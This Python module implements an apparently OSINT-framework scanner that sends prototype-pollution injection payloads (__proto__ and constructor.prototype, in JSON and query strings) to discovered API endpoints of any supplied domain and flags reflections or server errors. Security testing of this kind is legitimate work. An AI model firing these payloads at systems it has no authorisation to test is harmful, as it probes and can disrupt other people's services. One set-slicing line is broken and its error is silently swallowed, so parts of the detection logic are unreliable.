"""Prototype Pollution — JavaScript prototype chain injection scanner.

Prototype pollution allows attackers to inject properties into the Object
prototype, affecting all objects in a Node.js application. Can lead to
privilege escalation, RCE via gadget chains (eval, child_process), and
application logic bypass.

Tests: GET/POST JSON body, query string, URL path, deeply nested objects.
"""

from __future__ import annotations

import asyncio
import json
import re
import uuid
from typing import Any
from urllib.parse import urlparse, parse_qs

import httpx
import structlog

from src.adapters.scanners.base import BaseOsintScanner
from src.core.domain.entities.types import ScanInputType

log = structlog.get_logger()

# Prototype pollution payloads
_PP_PAYLOADS: list[tuple[str, str, str]] = [
    # (payload_type, payload_value, technique)
    # JSON body payloads
    ("json", '{"__proto__":{"polluted":true}}', "proto_direct"),
    ("json", '{"constructor":{"prototype":{"polluted":true}}}', "constructor_prototype"),
    ("json", '{"__proto__":{"toString":1}}', "proto_tostring"),
    ("json", '{"__proto__":{"valueOf":1}}', "proto_valueof"),
    # Query string payloads (qs library parsing)
    ("query", "__proto__[polluted]=true", "qs_proto"),
    ("query", "constructor[prototype][polluted]=true", "qs_constructor"),
    ("query", "__proto__.polluted=true", "qs_dot_notation"),
    # Nested object payloads
    ("json", '{"a":{"__proto__":{"polluted":true}}}', "nested_proto"),
    ("json", '{"a":{"b":{"__proto__":{"polluted":true}}}}', "deep_nested_proto"),
]

# Canary property name for detection
_CANARY_PROP = f"pp_scan_{uuid.uuid4().hex[:6]}"

# Node.js/Express indicators
_NODEJS_INDICATORS = re.compile(
    r"(?i)(express|node\.js|npm|nodejs|koa|fastify|hapi|nestjs|"
    r"cannot GET|cannot POST|ReferenceError|TypeError|SyntaxError|"
    r"at Object\.<anonymous>|at Module\._compile)"
)

# Common JSON API endpoints
_JSON_API_PATHS = [
    "/api", "/api/v1", "/api/v2", "/api/data",
    "/user", "/users", "/account", "/profile",
    "/settings", "/config", "/search",
    "/graphql", "/query",
]


class PrototypePollutionScanner(BaseOsintScanner):
    """JavaScript prototype pollution vulnerability scanner.

    Tests Node.js applications for prototype pollution via:
    - JSON body __proto__ injection
    - constructor.prototype injection
    - Query string parsing (qs library)
    - Nested object traversal
    Detects Node.js indicators and response anomalies after injection.
    """

    scanner_name = "prototype_pollution"
    supported_input_types = frozenset({ScanInputType.DOMAIN, ScanInputType.URL})
    cache_ttl = 1800
    scan_timeout = 90

    async def _do_scan(self, input_value: str, input_type: ScanInputType) -> dict[str, Any]:
        base_url = _normalise_url(input_value, input_type)
        return await self._manual_scan(base_url, input_value)

    async def _manual_scan(self, base_url: str, input_value: str) -> dict[str, Any]:
        nodejs_indicators: list[str] = []
        vulnerabilities: list[dict[str, Any]] = []
        identifiers: list[str] = []
        json_endpoints: list[str] = []

        async with httpx.AsyncClient(
            timeout=10,
            follow_redirects=True,
            verify=False,
            headers={"User-Agent": "Mozilla/5.0 (compatible; PPScanner/1.0)"},
        ) as client:

            # Step 1: Detect Node.js
            try:
                resp = await client.get(base_url)
                body = resp.text
                all_headers_str = " ".join(resp.headers.values())

                for header in ["X-Powered-By", "Server"]:
                    val = resp.headers.get(header, "")
                    if re.search(r"(?i)express|node", val):
                        nodejs_indicators.append(f"{header}: {val}")

                if _NODEJS_INDICATORS.search(body):
                    matches = _NODEJS_INDICATORS.findall(body)
                    nodejs_indicators.extend([f"body:{m}" for m in set(matches)[:3]])

                # Check for JSON API
                if "application/json" in resp.headers.get("content-type", ""):
                    json_endpoints.append(base_url)

            except Exception as exc:
                log.debug("Prototype pollution baseline failed", url=base_url, error=str(exc))

            # Discover JSON endpoints
            semaphore = asyncio.Semaphore(6)

            async def probe_json_endpoint(path: str) -> None:
                async with semaphore:
                    url = base_url.rstrip("/") + path
                    try:
                        resp = await client.post(url, json={"test": 1})
                        if "application/json" in resp.headers.get("content-type", "") or \
                           resp.status_code in (200, 201, 400, 422):
                            if url not in json_endpoints:
                                json_endpoints.append(url)
                    except Exception:
                        pass

            await asyncio.gather(*[probe_json_endpoint(p) for p in _JSON_API_PATHS])

            # Step 2: Test prototype pollution payloads
            async def test_json_pp(endpoint: str, payload_str: str, technique: str) -> None:
                async with semaphore:
                    try:
                        payload = json.loads(payload_str)
                        # Add canary property to detect if it ends up in responses
                        if "__proto__" in payload:
                            payload["__proto__"][_CANARY_PROP] = "polluted"
                        elif "constructor" in payload:
                            payload["constructor"]["prototype"][_CANARY_PROP] = "polluted"

                        resp = await client.post(
                            endpoint,
                            json=payload,
                            headers={"Content-Type": "application/json"},
                        )

                        # Check 1: Canary property reflected in response
                        if _CANARY_PROP in resp.text or "polluted" in resp.text:
                            vuln = {
                                "endpoint": endpoint,
                                "payload": payload_str,
                                "technique": technique,
                                "severity": "critical",
                                "evidence": "Prototype pollution: canary property reflected in response",
                            }
                            vulnerabilities.append(vuln)
                            identifiers.append(f"vuln:prototype_pollution:{technique}")
                            return

                        # Check 2: Server error after injection (property conflict)
                        if resp.status_code == 500 and _NODEJS_INDICATORS.search(resp.text):
                            vuln = {
                                "endpoint": endpoint,
                                "payload": payload_str,
                                "technique": technique,
                                "severity": "high",
                                "evidence": "Server error after prototype pollution payload — possible pollution",
                            }
                            vulnerabilities.append(vuln)
                            ident = f"vuln:prototype_pollution:error:{technique}"
                            if ident not in identifiers:
                                identifiers.append(ident)

                    except Exception:
                        pass

            async def test_query_pp(endpoint: str, payload: str, technique: str) -> None:
                async with semaphore:
                    try:
                        url = f"{endpoint}?{payload}&{_CANARY_PROP}=polluted"
                        resp = await client.get(url)
                        if _CANARY_PROP in resp.text or resp.status_code == 500:
                            vuln = {
                                "endpoint": endpoint,
                                "payload": payload,
                                "technique": technique,
                                "severity": "high",
                                "evidence": f"Query string proto pollution: status={resp.status_code}",
                            }
                            vulnerabilities.append(vuln)
                            ident = f"vuln:prototype_pollution:qs:{technique}"
                            if ident not in identifiers:
                                identifiers.append(ident)
                    except Exception:
                        pass

            tasks = []
            for endpoint in json_endpoints[:4]:
                for p_type, payload, technique in _PP_PAYLOADS:
                    if p_type == "json":
                        tasks.append(test_json_pp(endpoint, payload, technique))
                    elif p_type == "query":
                        tasks.append(test_query_pp(endpoint, payload, technique))

            await asyncio.gather(*tasks)

        return {
            "input": input_value,
            "scan_mode": "manual_fallback",
            "base_url": base_url,
            "nodejs_detected": len(nodejs_indicators) > 0,
            "nodejs_indicators": nodejs_indicators,
            "json_endpoints": json_endpoints,
            "vulnerabilities": vulnerabilities,
            "total_found": len(vulnerabilities),
            "extracted_identifiers": identifiers,
        }

    def _extract_identifiers(self, raw_data: dict[str, Any]) -> list[str]:
        return raw_data.get("extracted_identifiers", [])


def _normalise_url(value: str, input_type: ScanInputType) -> str:
    if input_type == ScanInputType.DOMAIN:
        return f"https://{value}"
    if not value.startswith(("http://", "https://")):
        return f"https://{value}"
    return value
